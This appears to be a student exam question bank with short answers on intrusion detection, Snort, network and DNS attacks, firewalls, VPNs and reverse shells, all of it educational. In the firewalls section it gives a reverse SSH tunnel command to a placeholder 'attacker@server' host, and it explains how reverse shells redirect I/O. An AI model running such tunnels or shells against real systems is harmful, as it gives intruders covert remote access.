# Intrusion Modal QB 2 Marks
---

# ✅ **SECTION 1 – IDS BASICS**

### **1. Define an Intrusion Detection System (IDS).**

An IDS is a security mechanism that monitors system or network activities to identify malicious behavior, policy violations, or unauthorized access attempts.

### **2. List two main types of IDS.**

* Host-Based IDS (HIDS)
* Network-Based IDS (NIDS)

### **3. State any two goals of IDS.**

* Detect intrusions accurately
* Provide timely alerts and forensic data

### **4. What is the primary function of an IDS?**

To detect suspicious or malicious activity and alert administrators without directly blocking traffic.

### **5. Differentiate between HIDS and NIDS.**

* **HIDS:** Monitors host-level logs, files, and processes.
* **NIDS:** Monitors network traffic at strategic points.

### **6. Mention any two internal threats to data.**

* Disgruntled employees
* Accidental data misuse by authorized users

### **7. Explain the term 'structured threat' with an example.**

A structured threat is a planned, well-organized attack executed by skilled attackers—e.g., cyber-espionage groups targeting financial systems.

### **8. What is a false positive in IDS?**

An alert triggered for benign activity mistakenly classified as malicious.

### **9. State the function of E-box in IDS architecture.**

The E-box (Event box) collects and formats audit data from monitored systems before analysis.

### **10. Name two audit record fields.**

* Timestamp
* Source IP address

---

# ✅ **SECTION 2 – IDS ANALYSIS & DETECTION**

### **1. What is meant by audit logs in IDS?**

Recorded events captured from systems or network activities used for intrusion detection and analysis.

### **2. List any two requirements of an effective IDS.**

* Low false positives
* Real-time detection capability

### **3. Give two examples of masqueraders.**

* Unauthorized user using stolen credentials
* Intruder bypassing authentication by impersonation

### **4. Mention any two advantages of misuse detection.**

* High accuracy for known attacks
* Low false positive rate

### **5. Explain 'profile-based anomaly detection' with an example.**

It detects deviations from normal user/system behavior; e.g., a user normally logs in once daily but logs in 30 times suddenly.

### **6. What is the effect of base-rate fallacy in IDS?**

Even with high detection accuracy, very low intrusion frequency causes many alerts to be false positives.

### **7. How does IDS assist in forensic analysis?**

It provides logs, alerts, and event traces to reconstruct attack sequences.

### **8. Define a 'signature' in misuse detection.**

A pattern representing a known attack, used to match malicious traffic.

### **9. What is an R-box in IDS architecture?**

The Reasoning box analyzes events using detection models and generates decisions/alerts.

### **10. Explain the impact of threshold-based detection in IDS.**

It triggers alerts when activity exceeds preset limits, helping detect brute-force or DoS attacks.

---

# ✅ **SECTION 3 – IPS (Intrusion Prevention System)**

### **1. What is the primary function of an IPS?**

To actively block or prevent detected malicious traffic in real time.

### **2. Differentiate between IDS and IPS.**

* **IDS:** Detects and alerts.
* **IPS:** Detects and blocks malicious activity.

### **3. List the four components of a typical IPS architecture.**

* Sensor
* Detection engine
* Console/management
* Database/logging module

### **4. State two key benefits of using IPS.**

* Automated attack prevention
* Reduced security workload on administrators

### **5. What is Host-Based IPS (HIPS)?**

IPS software installed on individual hosts to prevent malicious processes, file changes, or system misuse.

### **6. Mention two malicious behaviors that HIPS can detect.**

* Unauthorized registry modifications
* Unauthorized process injection or file tampering

### **7. Define Network-Based IPS (NIPS).**

A security system placed inline on the network to inspect and block malicious traffic in real time.

### **8. What is flow data protection in NIPS?**

Inspection of traffic flows to identify anomalies like scanning or DoS patterns.

### **9. Mention two components of NIDS.**

* Packet capture engine
* Detection engine

### **10. What is the role of the detection engine in NIDS?**

To analyze captured packets and compare them with rules or anomaly models.

---

# ✅ **SECTION 4 – NIDS DEPLOYMENT & ANALYSIS**

### **1. Where is NIDS usually deployed for monitoring DMZ traffic?**

Between the firewall and the DMZ, or at the DMZ boundary.

### **2. What is the advantage of placing NIDS outside the firewall?**

It detects attacks **before** they reach the firewall and identifies reconnaissance attempts.

### **3. Differentiate between Atomic and Composite pattern descriptors.**

* **Atomic:** Match single-packet patterns.
* **Composite:** Match multi-packet or sequence-based patterns.

### **4. What is Stateful Protocol Analysis?**

Analysis that tracks protocol states and verifies whether traffic follows protocol rules.

### **5. What is the first step in intrusion analysis?**

Data collection or event logging from network/host sources.

### **6. What is the role of feature extraction in intrusion analysis?**

Selecting relevant attributes (e.g., packet size, flow duration) for accurate detection.

### **7. What is meant by rate limiting in IDS response?**

Restricting traffic flows to mitigate attacks like DoS.

### **8. What is vulnerability analysis?**

The process of identifying weaknesses in systems that attackers can exploit.

### **9. List the two classifications of vulnerability analysis tools.**

* Passive scanners
* Active scanners

### **10. What is credential vulnerability analysis?**

Testing systems using valid credentials to identify deeper or internal vulnerabilities.

---

# ✅ **SECTION 5 – SNORT FUNDAMENTALS**

### **1. Explain the use of the content keyword.**

It matches specific payload bytes or strings within packets.

### **2. What is the purpose of the flags keyword in Snort?**

To match specific TCP flags like SYN, ACK, FIN, etc.

### **3. Differentiate between -> and <> in Snort rules.**

* **->** One-way traffic direction.
* **<>** Bidirectional traffic inspection.

### **4. What is the significance of classtype in Snort rules?**

Categorizes alerts such as “attempted-admin” or “trojan-activity.”

### **5. What is the use of sid in Snort rules?**

A unique Snort rule identifier for tracking and management.

### **6. Mention the importance of rev in Snort rules.**

Indicates the revision number of a rule to manage versions.

### **7. What are the advantages of using variables in Snort configuration?**

Improves readability and makes configuration easier to update.

### **8. Explain the function of the dsize keyword.**

Matches packet payloads based on their data size.

### **9. What is the role of the itype and icode keywords?**

Match ICMP message type (itype) and code (icode).

### **10. Explain frag2 preprocessor.**

Handles IP fragmentation by reassembling fragments for better detection.

---

# ✅ **SECTION 6 – SNORT ADVANCED**

### **1. Explain stream4 preprocessor.**

Tracks and reassembles TCP streams for stateful inspection.

### **2. What is portscan detection in Snort?**

Identifies scanning behaviors such as SYN scans, FIN scans, or UDP sweeps.

### **3. What is the difference between alert and log actions in Snort?**

* **alert:** Generates an alert message.
* **log:** Records packet details without alerting.

### **4. Define Oinkmaster.**

A tool used to download and manage Snort rule updates.

### **5. What is the use of the include keyword in snort.conf?**

Imports external rule files or configuration sections.

### **6. What are the categories of default Snort rule files?**

* Attack rules
* Policy rules
* Trojan rules
* Malware/backdoor rules

### **7. How is database output used in Snort?**

Logs alerts into SQL databases for reporting and analysis.

### **8. What is the role of Stunnel in Snort logging?**

Provides encrypted communication when sending Snort logs to remote servers.

### **9. Differentiate between alert_fast and alert_full output plugins.**

* **alert_fast:** One-line summary per alert.
* **alert_full:** Detailed multi-line alert information.

### **10. What is the purpose of Berkeley Packet Filters (BPF)?**

To filter network traffic using expressions before Snort processes it.

---

# ✅ **SECTION 7 – NETWORK ATTACKS & DNS SECURITY**

### **1. Differentiate between raw sockets and pcap API in sniffing.**

* **Raw sockets:** Provide low-level packet access but limited filtering.
* **pcap API:** Offers efficient packet capture with advanced filtering.

### **2. What is packet spoofing?**

Forging packet headers to impersonate another IP or host.

### **3. Mention two tools for packet sniffing.**

* Wireshark
* tcpdump

### **4. Explain TCP reset attack.**

An attacker sends forged TCP RST packets to terminate an active session.

### **5. State the significance of the Mitnick attack.**

A classic TCP sequence prediction attack enabling remote session hijacking.

### **6. What is DNS cache poisoning?**

Injecting false DNS records into a resolver’s cache to redirect traffic.

### **7. What is the Kaminsky attack?**

A fast DNS poisoning technique exploiting weak transaction IDs.

### **8. What is DNSSEC?**

A DNS extension providing digital signatures for integrity and authenticity.

### **9. How does a denial-of-service attack affect DNS servers?**

It overwhelms DNS servers, making domain resolution unavailable.

### **10. Define DNS rebinding attack.**

A technique where attackers force a victim’s browser to treat malicious sites as trusted, bypassing same-origin policies.

---

# ✅ **SECTION 8 – TCP/IP ATTACKS**

### **1. What is TCP session hijacking?**

Taking over an active TCP session by predicting sequence numbers.

### **2. What is the TCP three-way handshake?**

Connection setup involving SYN → SYN-ACK → ACK exchange.

### **3. What is a SYN flooding attack?**

Sending massive SYN requests to exhaust server resources and deny service.

### **4. How does sniffing help in spoofing?**

It reveals sequence numbers and IP addresses needed to craft spoofed packets.

### **5. What is an ICMP redirect attack?**

False ICMP redirect messages trick a host into sending traffic through the attacker.

### **6. How does ARP poisoning enable man-in-the-middle attacks?**

It corrupts ARP tables, making victims send traffic through the attacker’s MAC address.

### **7. Which tool is called the Swiss Army Knife?**

Netcat (nc).

### **8. What are the various purposes of netcat command?**

File transfer, banner grabbing, port scanning, and reverse/bind shells.

### **9. How is loopback address used for troubleshooting?**

Pinging 127.0.0.1 checks if the TCP/IP stack is functioning.

### **10. How to perform sniffing using tcpdump?**

Use: `tcpdump -i eth0` to capture live packets.

---

# ✅ **SECTION 9 – FIREWALLS & VPNs**

### **1. What is the main role of a VPN server in a VPN setup?**

To authenticate clients and create encrypted tunnels for secure communication.

### **2. Compare IPsec Tunneling and TLS/SSL Tunneling.**

* **IPsec:** Operates at network layer; protects all IP traffic.
* **TLS/SSL:** Operates at transport layer; secures specific applications.

### **3. List the five IPv4 Netfilter hooks.**

* PREROUTING
* INPUT
* FORWARD
* OUTPUT
* POSTROUTING

### **4. What is the difference between ingress and egress filtering?**

* **Ingress:** Filters incoming packets.
* **Egress:** Filters outgoing packets.

### **5. Define a firewall.**

A security device that enforces traffic filtering rules between networks.

### **6. Give an example of an iptables rule to drop incoming ICMP echo requests.**

`iptables -A INPUT -p icmp --icmp-type echo-request -j DROP`

### **7. Define Virtual Private Network (VPN).**

A secure communication channel created over a public network using encryption.

### **8. How can the VPN tunnel be tested using ping and tcpdump?**

Ping through the tunnel and observe encapsulated packets using `tcpdump` on the tunnel interface.

### **9. Explain reverse SSH tunneling with an example.**

A remote machine forwards its local port to the attacker’s machine:
`ssh -R 4444:localhost:22 attacker@server`

### **10. How can other hosts use a dynamic SSH tunnel?**

By configuring their applications to use the SOCKS proxy created with `ssh -D`.

---

# ✅ **SECTION 10 – BGP, REVERSE SHELLS, PORT FORWARDING**

### **1. What is an autonomous system (AS), and why is it important in BGP routing?**

A collection of IP networks under one administrative domain; BGP routes traffic between ASes.

### **2. Explain “longest prefix match” in BGP and how it relates to IP prefix hijacking.**

Routers choose the most specific prefix; attackers can announce more specific routes to hijack traffic.

### **3. What is a reverse shell, and why is it used?**

A shell session where the victim connects back to the attacker—useful for bypassing firewalls.

### **4. Explain the role of file descriptors in a reverse shell.**

stdin, stdout, stderr are redirected to the network socket to allow remote command execution.

### **5. How does dup2() help in redirecting I/O for a reverse shell?**

It duplicates the socket descriptor to file descriptors 0, 1, and 2, enabling remote control.

### **6. Why is the reverse-shell command often passed to another shell using -c?**

To ensure proper execution of complex command strings.

### **7. What is the role of the SOCKS protocol in dynamic port forwarding?**

It routes multiple types of traffic through a single encrypted SSH tunnel.

### **8. How does the VPN server release packets into the private network?**

By decapsulating tunnel packets and routing them to internal interfaces.

### **9. What are TUN and TAP interfaces in VPNs?**

* **TUN:** Handles layer-3 (IP) packets.
* **TAP:** Handles layer-2 (Ethernet) frames.

### **10. List two main functions of a firewall.**

* Packet filtering
* Network access control

---
